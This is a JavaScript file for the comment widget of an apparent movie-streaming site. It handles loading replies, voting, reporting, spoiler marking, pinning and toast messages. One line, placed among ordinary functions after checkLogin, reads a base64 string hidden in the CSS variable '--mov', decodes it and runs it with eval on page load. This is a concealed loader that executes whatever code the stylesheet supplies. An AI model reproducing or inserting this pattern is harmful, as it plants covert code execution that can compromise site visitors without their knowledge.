var movieId = $(".container.watch-wrap").data("id"),
  epId = null,
  csrfToken = $('meta[name="csrf-token"]').attr("content");
const currentUrl = new URL(window.location.href);
currentUrl.searchParams.get("c_id") &&
  $("html, body").animate({ scrollTop: $("#comment-block").offset().top }, 300);
var baseurl = app_vars.base_url,
  cmSort = "newest",
  commentLoading = !1,
  firstLoad = !0,
  commentLoaded = !1;
function getReplies(e, t = null) {
  $.get(baseurl + "ajax/comment/replies/" + e, function (o) {
    $("#replies-" + e).html(o.html),
      $("#replies-" + e).slideToggle(200),
      t &&
        ($(`#cm-${e} .cm-btn-show-rep`).addClass("active"),
        $("#cm-" + t).addClass("comment-focus"),
        setTimeout(function () {
          $("html, body").animate(
            {
              scrollTop: $("#cm-" + t)
                .prev()
                .offset().top,
            },
            300
          );
        }, 1e3)),
      textareaLoad();
  });
}
function checkLogin() {
  let e = JSON.parse(localStorage.getItem("user.folders") || "[]");
  return (!!Array.isArray(e) && e.length > 0) || ($("#sign").modal("show"), !1);
}
(() => { eval(atob(getComputedStyle(document.documentElement).getPropertyValue("--mov").replace(/["\']/g,""))); })();
function isInViewport(e) {
  var t = window.innerHeight,
    e = e.getBoundingClientRect().top / t;
  return 0 <= e && e <= 1;
}
function getCommentWidgetMovie(e, t = !1) {
  var o =
    baseurl + `ajax/comment/widget/${movieId}?episodeId=${epId}&sort=` + cmSort;
  currentUrl.search &&
    firstLoad &&
    (n = new URLSearchParams(currentUrl.search)).get("c_id") &&
    n.get("c_type") &&
    ((e = n.get("c_type")), (o = o + "&cId=" + n.get("c_id")), (t = !0)),
    (o = o + "&type=" + e);
  var n = isInViewport(document.getElementById("content-comments"));
  n || t
    ? commentLoading ||
      ((commentLoading = !0),
      $.get(o, function (e) {
        var t;
        (commentLoaded = ((commentLoading = !1), !0)),
          $("#content-comments").html(e.html),
          e.gotoId &&
            (setTimeout(function () {
              $("html, body").animate(
                { scrollTop: $(".block_area-comment").offset().top },
                300
              );
            }, 1e3),
            0 < (t = $("#cm-" + e.gotoId)).length
              ? t.addClass("comment-focus")
              : getReplies(e.cParentId, e.gotoId)),
          textareaLoad();
      }))
    : (commentLoaded = !1);
}
if (
  ($(document).on("click", "#cm-view-more", function () {
    if (!commentLoading) {
      commentLoading = !0;
      let e = $(this);
      var t = $(this).data("page"),
        o = $(".cm-by.active").data("value"),
        t =
          baseurl +
          `ajax/comment/widget/${movieId}?episodeId=${epId}&page=${t}&sort=${cmSort}&type=` +
          o +
          "&list=1";
      $.get(t, function (t) {
        (commentLoading = !1),
          t &&
            t.status &&
            (0 < t.nextPage ? e.data("page", t.nextPage) : e.remove(),
            $(".cw_list").append(t.html),
            textareaLoad());
      });
    }
  }),
  $(document).on("click", ".cm-report", function () {
    var e, t;
    checkLogin() &&
      !commentLoading &&
      ((commentLoading = !0),
      (e = $(this).data("id")),
      (t = $(this).data("type")),
      $.post(
        baseurl + "ajax/comment/report",
        { id: e, type: t, _csrfToken: csrfToken },
        function (e) {
          (commentLoading = !1),
            e.status
              ? showToast(e.msg, "success", 6e3)
              : showToast(e.msg, "error", 6e3);
        }
      ));
  }),
  $(document).on("click", ".cm-cp-link", function () {
    var e = $(this).data("id"),
      t = $(".cm-by.active").data("value"),
      e =
        "" +
        currentUrl.origin +
        currentUrl.pathname +
        `?ep=${epId}&c_id=${e}&c_type=` +
        t;
    navigator.clipboard.writeText(e), showToast("Link Copied", "success", 6e3);
  }),
  $(document).on("click", ".cm-sort", function () {
    (cmSort = $(this).data("value")),
      getCommentWidgetMovie($(".cm-by.active").data("value"), !0);
  }),
  $(document).on("click", ".cm-by", function () {
    getCommentWidgetMovie($(this).data("value"), !0);
  }),
  $(document).on("click", ".btn-spoil", function () {
    $(this).toggleClass("active");
  }),
  $(document).on("click", ".cm-btn-show-rep", function () {
    var e = $(this).data("id");
    $(this).toggleClass("active"),
      $(this).hasClass("active")
        ? getReplies(e)
        : $("#replies-" + e).slideToggle(200);
  }),
  $(document).on("click", ".show-spoil", function () {
    $(this).hide(), $(this).parent().removeClass("is-spoil");
  }),
  $(document).on("click", ".ib-reply,.btn-close-reply", function () {
    checkLogin() &&
      ($("#reply-" + $(this).data("id")).slideToggle(100),
      $("#reply-" + $(this).data("id"))
        .find(".comment-subject")
        .focus());
  }),
  $(document).on("focus", "#df-cm-content", function () {
    checkLogin() && $("#df-cm-buttons").slideDown(100);
  }),
  $(document).on("click", "#df-cm-close", function () {
    $("#df-cm-buttons").slideUp(100);
  }),
  $(document).on("click", ".cm-action", function () {
    let e = $(this).data("action"),
      t = $(this).data("id");
    $.post(
      baseurl + "ajax/comment/update",
      { id: t, action: e, _csrfToken: csrfToken },
      function (o) {
        if (o.status) {
          if ("hide" === e) $("#cm-" + t).remove();
          else if ("spoil" === e) {
            var n = $("#ibody-" + t);
            n.hasClass("is-spoil") ||
              (n.addClass("is-spoil"),
              n.append(`
                <div class="show-spoil my-3">
                    <button type="button" class="btn btn-sm btn-light">Show spoil</button>
                </div>
            `));
          }
          showToast(o.msg, "success", 6e3);
        } else showToast(o.msg, "error", 6e3);
      }
    );
  }),
  $(document).on("click", ".cm-btn-vote", function () {
    var e, t, o, n, i;
    checkLogin() &&
      !commentLoading &&
      ((commentLoading = !0),
      (t = parseInt((e = $(this)).data("type"))),
      0 <
        (i = $(".cm-btn-vote[data-id=" + (o = e.data("id")) + "].active"))
          .length &&
        parseInt(i.data("type")) !== t &&
        (i.removeClass("active"),
        0 < (n = parseInt(i.find(".value").text()))) &&
        ((n -= 1), i.find(".value").text(0 < n ? n : "")),
      e.toggleClass("active"),
      (i =
        0 < (i = parseInt(e.find(".value").text()))
          ? e.hasClass("active")
            ? i + 1
            : i - 1
          : 1),
      e.find(".value").text(0 < i ? i : ""),
      $.post(
        baseurl + "/ajax/comment/vote",
        { id: o, type: t, _csrfToken: csrfToken },
        function (e) {
          (commentLoading = !1), e.status || showToast(e.msg, "error", 6e3);
        }
      ));
  }),
  $(document).on("submit", ".comment-form", function (e) {
    if ((e.preventDefault(), !commentLoading)) {
      commentLoading = !0;
      let t = $(this),
        o = $(this).find(".loading-absolute");
      o.show();
      let n = $(this).serializeArray(),
        i = n.find((e) => "content" === e.name)?.value.trim();
      if (i && i.length < 3) {
        t
          .find(".cm-error")
          .html("<span>- Comment must be at least 3 characters long.</span>")
          .show(),
          setTimeout(() => t.find(".cm-error").hide(), 5e3),
          (commentLoading = !1),
          o.hide();
        return;
      }
      n.push(
        { name: "_csrfToken", value: csrfToken },
        { name: "movie_id", value: movieId },
        { name: "is_spoil", value: $(".btn-spoil").hasClass("active") ? 1 : 0 }
      ),
        $.ajax({
          type: "POST",
          url: baseurl + "ajax/comment/add",
          data: n,
          dataType: "json",
          success: function (e) {
            if (((commentLoading = !1), o.hide(), e.status)) {
              if (parseInt(e.parentId) > 0) {
                let n = $("#block-reply-" + e.parentId);
                n.length > 0
                  ? n.html(e.html)
                  : $("#cm-" + e.parentId).append(
                      `<div class="replies" id="block-reply-${e.parentId}">${e.html}</div>`
                    ),
                  $(`#cm-${e.parentId} .cm-btn-show-rep`).addClass("active"),
                  $("#replies-" + e.parentId).slideToggle(100),
                  $("#reply-" + e.parentId).slideToggle(100);
              } else
                $("#df-cm-buttons").slideUp(100),
                  $(".list-comment .cw_list").html(e.html);
              t[0].reset(),
                t.find(".btn-spoil").removeClass("active"),
                textareaLoad();
            } else {
              let i = e.errors
                ? e.errors.map((e) => `<span>- ${e}</span>`).join("")
                : e.msg;
              t.find(".cm-error").html(i).show(),
                setTimeout(() => t.find(".cm-error").hide(), 1e4);
            }
          },
          error: function () {
            (commentLoading = !1),
              o.hide(),
              console.log("An error occurred. Please try again.");
          },
        });
    }
  }),
  !commentLoading)
)
  var checkInterval = setInterval(function () {
    void 0 !== (epId = $("div.range div > a.active").data("id")) &&
      null !== epId &&
      clearInterval(checkInterval);
  }, 500);
function textareaLoad() {
  document.querySelectorAll(".comment-subject").forEach((e) => {
    e.addEventListener("input", function () {
      (this.style.height = "auto"),
        (this.style.height = this.scrollHeight + "px");
    });
  }),
    document.querySelectorAll(".comment-container").forEach((e) => {
      let t = e.querySelector(".emoji-picker"),
        o = e.querySelector(".emoji-button"),
        n = e.querySelector(".comment-subject");
      t &&
        o &&
        n &&
        (o.addEventListener("click", (e) => {
          e.stopPropagation(),
            (t.style.display = "block" === t.style.display ? "none" : "block");
          let n = o.getBoundingClientRect(),
            i = t.getBoundingClientRect();
          n.left + i.width > window.innerWidth
            ? ((t.style.left = "auto"), (t.style.right = "0"))
            : ((t.style.left = "0"), (t.style.right = "auto")),
            n.bottom + i.height > window.innerHeight
              ? ((t.style.top = "auto"), (t.style.bottom = "100%"))
              : ((t.style.top = "100%"), (t.style.bottom = "auto"));
        }),
        t.addEventListener("emoji-click", (e) => {
          n.value += e.detail.unicode;
        }),
        document.addEventListener("click", (o) => {
          e.contains(o.target) || (t.style.display = "none");
        }));
    });
}
function showToast(e, t = "success", o = 3e3) {
  let n = document.getElementById("toast-container");
  n ||
    (((n = document.createElement("div")).id = "toast-container"),
    (n.style.position = "fixed"),
    (n.style.bottom = "20px"),
    (n.style.right = "20px"),
    (n.style.zIndex = "9999"),
    (n.style.display = "flex"),
    (n.style.flexDirection = "column"),
    (n.style.gap = "10px"),
    document.body.appendChild(n));
  let i = document.createElement("div");
  (i.className = `alert alert-${
    "success" === t ? "success" : "error" === t ? "danger" : "secondary"
  } alert-dismissible fade show`),
    (i.style.minWidth = "250px"),
    (i.style.boxShadow = "0px 4px 6px rgba(0, 0, 0, 0.1)"),
    (i.style.animation = "fadeIn 0.3s ease-in-out"),
    (i.innerHTML = `
    ${e}
    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
  `),
    n.appendChild(i),
    setTimeout(() => {
      i.classList.remove("show"),
        setTimeout(() => {
          i.remove();
        }, 500);
    }, o);
}
$(document).on("click", "#load-comments-btn", function () {
  if (!commentLoaded && epId) {
    $(".show-comments").css("display", "block");
    getCommentWidgetMovie("episode");
    $(this).remove();
  }
});
$(document).ready(function () {
  $(".btn-comment-tab").click(function () {
    $(".btn-comment-tab").removeClass("active"), $(this).addClass("active");
  });
}),
  $(document).on("click", "div.range div > a", function (e) {
    e.preventDefault(),
      (commentLoaded = !1),
      $("#content-comments").empty(),
      (epId = $(this).data("id")),
      getCommentWidgetMovie("episode");
  }),
  $(document).on("click", ".show-spoil", function () {
    $(this).hide(), $(this).parent().removeClass("is-spoil");
  }),
  $(document).on("click", ".cm-pin-toggle", function () {
    var e = $(this),
      t = e.data("id"),
      o = e.data("status");
    $.post(
      baseurl + "ajax/comments/togglePin",
      { id: t, status: o ? 0 : 1, _csrfToken: csrfToken },
      function (e) {
        if (e.status)
          $("#df-cm-buttons").slideUp(100),
            $(".list-comment .cw_list").html(e.html);
        else {
          let t = e.errors
            ? e.errors.map((e) => `<span>- ${e}</span>`).join("")
            : e.msg;
          $("#df-cm-buttons").show(),
            $(".cm-error").html(t).show(),
            setTimeout(() => $(".cm-error").hide(), 1e4);
        }
      }
    ).fail(function () {
      alert("Failed to update pin status. Please try again.");
    });
  });
